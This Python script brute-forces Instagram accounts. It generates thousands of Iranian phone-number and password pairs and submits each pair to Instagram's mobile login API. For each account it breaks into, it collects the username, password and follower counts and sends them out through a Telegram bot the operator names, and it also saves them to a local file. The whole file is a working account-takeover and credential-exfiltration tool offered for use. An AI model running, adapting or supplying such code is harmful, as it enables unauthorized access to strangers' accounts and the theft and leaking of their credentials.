import  sys, os, random, time, user_agent,secrets,requests,json,uuid
from secrets import token_hex
from uuid import uuid4
import pyfiglet
from pyfiglet import figlet_format
logo1 = figlet_format('',font ='devilish')
hk = ('')
nkt = ('-- '*20)
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
M = "\033[1;96m"
os.system('clear')
os.system('rm -rf .1.txt')
print(M+logo1)
print(K+hk)
print(H+nkt)
token = input(E+"-"+A+"!"+E+"-"+H+ " Enter BoT Token :  "+C)
ID = input(E+"-"+A+"!"+E+"-"+H+ " Enter YouR ID :  "+C)
def ToOLA():
	os.system('clear')
	global ID, token 
	ok = 0
	cp = 0
	sk = 0
	os.system('clear')
	os.system('rm -rf .1.txt')
	import time
	def Comb():
		for lik in range(5000):
			A0=random.randint(1000000, 9999999)
			H0=("+98990"+str(A0)+":0990"+str(A0))
			with open(".1.txt", "a") as Ccom:
				Ccom.write(str(H0)+"\n")
	Comb()
	fil=".1.txt"
	file=open(fil,"r").read().splitlines()
	for line in file:
		user=line.split(':')[0]
		pw=line.split(':')[1]
			
		url = 'https://i.instagram.com/api/v1/accounts/login/'
		headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
        'Accept':'*/*', 
        'Cookie':'missing', 
        'Accept-Encoding':'gzip, deflate', 
        'Accept-Language':'en-US', 
        'X-IG-Capabilities':'3brTvw==', 
        'X-IG-Connection-Type':'WIFI', 
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
        'Host':'i.instagram.com'}
		uid = str(uuid4())
		data = {'uuid':uid, 
         'password':pw, 
         'username':user, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
		req = requests.post(url,headers=headers,data=data,allow_redirects=True,verify=True)
		if str("logged_in_user") in req.json():
			ok+=1
			userx = req.json()['logged_in_user']['username']
			try:
				cookiie = secrets.token_hex(8)*2
				head = {
                'HOST': "www.instagram.com",
                'KeepAlive' : 'True',
                'user-agent' : "Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)",
                'Cookie': cookiie,
                'Accept' : "*/*",
                'ContentType' : "application/x-www-form-urlencoded",
                "X-Requested-With" : "XMLHttpRequest",
                "X-IG-App-ID": "936619743392459",
                "X-Instagram-AJAX" : "missing",
                "X-CSRFToken" : "missing",
                "Accept-Language" : "en-US,en;q=0.9"}
				aip = 'https://www.instagram.com/'+str(userx)+'/?__a=1'
				look = requests.get(aip,headers=head).json()
				id = str(look['graphql']['user']['id'])
				name = str(look['graphql']['user']['full_name'])
				followers = str(look['graphql']['user']['edge_followed_by']['count'])
				following = str(look['graphql']['user']['edge_follow']['count'])
				lok = requests.get("https://o7aa.pythonanywhere.com/?id="+str(id))   
				iok = lok.json()
				daata = iok['data']
				
			except:pass
			JoAc = ('◆━━━━━━◆❃◆━━━━━━◆ \n🩸 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : '+str(userx)+'\n🩸 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : '+str(pw)+'\n🩸 𝙿𝙷𝙾𝙽𝙴 : '+str(user)+'\n🩸 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : '+str(followers)+'\n🩸 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 : '+str(following)+'\n🩸 𝙳𝙰𝚃𝙴 : '+str(daata)+'\n◆━━━━━━◆❃◆━━━━━━◆')
			requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(JoAc))
			f=open('WorkAcc.txt','a')
			f.write(JoAc+"\n")
			f.close()
				
		elif str('"message":"challenge_required","challenge"') in req.json():
				cp+=1
		else:
			os.system('clear')
			sk+=1
			print(A+'	'+"«"+E+user+A+"»"+H+" : "+A+"«"+E+pw+A+"»")
			print("{}  ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ".format(B))
			print(" {}-{}!{}-{}  Vaild {} : {}{}".format(A,E,A,E,A,E,str(ok))+" {}-{}!{}-{}  SeC{} : {}{}".format(A,K,A,K,A,K,str(cp))+" {}-{}!{}-{}  Check {} : {}{}".format(A,H,A,B,A,H,str(sk)))
			print("{} ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ،  ".format(B))
			print("        	")
ToOLA()
